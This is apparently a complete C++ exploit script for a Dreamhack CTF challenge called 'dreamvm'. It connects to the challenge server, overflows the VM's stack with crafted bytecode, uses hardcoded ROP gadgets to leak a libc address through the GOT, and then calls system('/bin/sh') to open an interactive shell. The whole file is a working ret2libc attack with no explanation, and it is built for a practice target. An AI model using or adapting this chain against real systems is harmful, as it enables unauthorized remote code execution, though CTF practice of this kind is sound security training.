#include <pwntools>
#include <vector>
#include <iostream>
#include <string>
#include <stdint.h>

using namespace std::string_literals;
typedef std::string str;
typedef uint64_t number;

// connection
//Process io("./dreamvm",false);
Remote io("host1.dreamhack.games",17822);

// Gadgets
number L_POP_RDI = 0x400903;
number L_RET = 0x40051e;
number L_POP_RDX = 0x400854;
number L_POP_RSI = 0x400901; // pop rdx ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret

// Addr
number read_got = 0x600fe0;
number open_got = 0x600FE8;
number write_all = 0x40085c;
number _main = 0x400590;
number offset_open = 0x10fd50;
number offset_system = 0x04f4e0;
number str_bin_sh = 0x1b40fa;

std::string get_code(number n) {
    return "\x04" + pack::p64(n) + "\x06" + "\x01";
}

int main() {
    str code;
    code += get_code(0x38);
    code += get_code(0x10);
    code += get_code(0x10);
    code += get_code(0x10);
    code += get_code(0x10);
    code += get_code(0x10);
    code.resize(0x100,'A');

    io.send(code);

    io.send(pack::p64(L_POP_RDI));
    io.send(pack::p64(open_got));
    io.send(pack::p64(write_all));
    io.send(pack::p64(L_POP_RDI));
    io.send(pack::p64(0));
    io.send(pack::p64(_main));

    str leak_str = io.recv(0x8);
    number libc_leak = pack::u64(leak_str);
    number libc_base = libc_leak - offset_open;
    printf("Libc leak: %p\n",(void *)libc_base);

    code.clear();
    code += get_code(0x38);
    code += get_code(0x10);
    code += get_code(0x10);
    code += get_code(0x10);
    code.resize(0x100,'A');

    io.send(code);

    io.send(pack::p64(L_POP_RDI));
    io.send(pack::p64(libc_base + str_bin_sh));
    io.send(pack::p64(L_RET));
    io.send(pack::p64(libc_base + offset_system));
    io.interactive();
}
